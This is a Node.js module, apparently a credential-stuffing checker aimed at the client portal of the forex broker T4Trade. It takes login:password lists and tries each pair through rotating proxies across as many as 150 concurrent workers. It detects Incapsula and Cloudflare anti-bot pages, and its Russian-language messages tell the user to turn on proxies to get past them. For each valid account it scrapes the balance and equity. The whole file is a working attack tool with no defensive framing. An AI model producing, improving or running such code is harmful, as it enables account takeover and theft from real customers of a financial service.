const https = require('https');
const { URL } = require('url');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

const BASE_URL = 'https://www.t4trade.com';
const LOGIN_URL = `${BASE_URL}/json/login.json`;
const HOME_URL = `${BASE_URL}/en/client-portal/home`;
const PORTAL_URL = `${BASE_URL}/en/client-portal`;

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36';

function buildProxyAgent(proxyStr, proxyType) {
  if (!proxyStr) return null;
  let p = proxyStr.trim();
  if (!p) return null;
  let proxyUrl;
  if (p.includes('://')) {
    proxyUrl = p;
  } else {
    const parts = p.split(':');
    if (parts.length === 2) {
      proxyUrl = `${proxyType}://${parts[0]}:${parts[1]}`;
    } else if (parts.length === 4) {
      proxyUrl = `${proxyType}://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
    } else {
      proxyUrl = `${proxyType}://${p}`;
    }
  }
  if (proxyType.startsWith('socks')) return new SocksProxyAgent(proxyUrl);
  return new HttpsProxyAgent(proxyUrl);
}

function request(urlStr, { method = 'GET', headers = {}, body = null, agent = null, cookies = {} } = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(urlStr);
    const cookieHeader = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    const opts = {
      method,
      hostname: u.hostname,
      path: u.pathname + u.search,
      headers: {
        'User-Agent': UA,
        ...(cookieHeader ? { Cookie: cookieHeader } : {}),
        ...headers,
      },
      timeout: 25000,
    };
    if (agent) opts.agent = agent;

    const req = https.request(opts, (res) => {
      const setCookie = res.headers['set-cookie'] || [];
      const newCookies = { ...cookies };
      for (const c of setCookie) {
        const [pair] = c.split(';');
        const idx = pair.indexOf('=');
        if (idx > 0) newCookies[pair.slice(0, idx).trim()] = pair.slice(idx + 1).trim();
      }
      let data = '';
      res.on('data', (chunk) => (data += chunk));
      res.on('end', () => resolve({ status: res.statusCode, body: data, cookies: newCookies, headers: res.headers }));
    });
    req.on('error', reject);
    req.on('timeout', () => req.destroy(new Error('Timeout')));
    if (body) req.write(body);
    req.end();
  });
}

function isBlocked(text) {
  if (!text) return false;
  const markers = [
    'incapsula incident',
    '_incapsula_resource',
    'request unsuccessful',
    'attention required',
    'cf-browser-verification',
    'checking your browser',
  ];
  const low = text.toLowerCase();
  return markers.some((m) => low.includes(m));
}

function extractSecurity(html) {
  const m = html.match(/name=["']security["']\s+value=["']([^"']+)["']/i)
    || html.match(/value=["']([^"']+)["']\s+name=["']security["']/i);
  return m ? m[1] : '';
}

function parseBalance(html) {
  const result = { accounts: [], raw_balance: null, raw_equity: null };
  const balMatch = html.match(/Balance[:\s]*([€$£]?[\d,.]+)/i);
  if (balMatch) result.raw_balance = balMatch[1].trim();
  const eqMatch = html.match(/Equity[:\s]*([€$£]?[\d,.]+)/i);
  if (eqMatch) result.raw_equity = eqMatch[1].trim();
  return result;
}

async function checkAccount(login, password, proxyStr = '', proxyType = 'https') {
  try {
    const agent = buildProxyAgent(proxyStr, proxyType);

    const portal = await request(PORTAL_URL, {
      headers: { Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' },
      agent,
    });
    if (isBlocked(portal.body)) {
      return { login, status: 'error', error: 'Заблокировано антиботом (Incapsula). Включите прокси.', accounts: [] };
    }

    const security = extractSecurity(portal.body);
    let cookies = portal.cookies;

    if (!security) {
      return { login, status: 'error', error: 'Не удалось получить токен (возможна блокировка). Включите прокси.', accounts: [] };
    }

    const form = new URLSearchParams({
      security,
      action: 'login',
      currentContext: 'ea',
      login: login.trim(),
      password: password.trim(),
      otp: '',
      otp_sms: '',
    }).toString();

    const loginResp = await request(LOGIN_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        Accept: 'application/json, text/javascript, */*; q=0.01',
        Origin: BASE_URL,
        Referer: PORTAL_URL,
      },
      body: form,
      agent,
      cookies,
    });
    cookies = loginResp.cookies;

    if (isBlocked(loginResp.body)) {
      return { login, status: 'error', error: 'Заблокировано антиботом (Incapsula). Включите прокси.', accounts: [] };
    }

    let loginJson = {};
    try { loginJson = JSON.parse(loginResp.body); } catch { loginJson = {}; }

    let isSuccess = false;
    if (loginJson && typeof loginJson === 'object') {
      const statusVal = String(loginJson.status || '').toLowerCase();
      isSuccess = ['success', 'ok', '1', 'true'].includes(statusVal) || loginJson.success === true;
      if (!isSuccess && loginJson.redirect && /home/i.test(String(loginJson.redirect))) {
        isSuccess = true;
      }
    }
    if (!isSuccess) {
      const err = (loginJson && (loginJson.message || loginJson.error)) || 'Неверные данные';
      return { login, status: 'invalid', error: String(err), accounts: [] };
    }

    const home = await request(HOME_URL, { agent, cookies });
    const bal = parseBalance(home.body);

    return {
      login,
      status: 'valid',
      accounts: bal.accounts,
      raw_balance: bal.raw_balance,
      raw_equity: bal.raw_equity,
    };
  } catch (e) {
    const msg = e && e.message === 'Timeout' ? 'Timeout' : (e ? String(e.message || e) : 'Error');
    return { login, status: 'error', error: msg, accounts: [] };
  }
}

function pickProxy(list, idx, rotation) {
  if (!list || !list.length) return '';
  if (rotation === 'every10') return list[Math.floor(idx / 10) % list.length];
  if (rotation === 'every50') return list[Math.floor(idx / 50) % list.length];
  return list[idx % list.length];
}

async function checkBatch({ accounts = [], threads = 5, proxies = [], proxy_type = 'https', proxy_rotation = 'each' }) {
  const parsed = [];
  accounts.forEach((item) => {
    const i = item.indexOf(':');
    if (i > 0) parsed.push({ login: item.slice(0, i), password: item.slice(i + 1), idx: parsed.length });
  });

  const results = [];
  const limit = Math.min(Math.max(threads, 1), 150);
  let cursor = 0;

  async function worker() {
    while (cursor < parsed.length) {
      const a = parsed[cursor++];
      const proxy = pickProxy(proxies, a.idx, proxy_rotation);
      const r = await checkAccount(a.login, a.password, proxy, proxy_type);
      results.push(r);
    }
  }

  await Promise.all(Array.from({ length: limit }, worker));

  const valid = results.filter((r) => r.status === 'valid').length;
  const invalid = results.filter((r) => r.status === 'invalid').length;
  const errors = results.filter((r) => r.status === 'error').length;
  return { total: results.length, valid, invalid, errors, results };
}

module.exports = { checkBatch, checkAccount };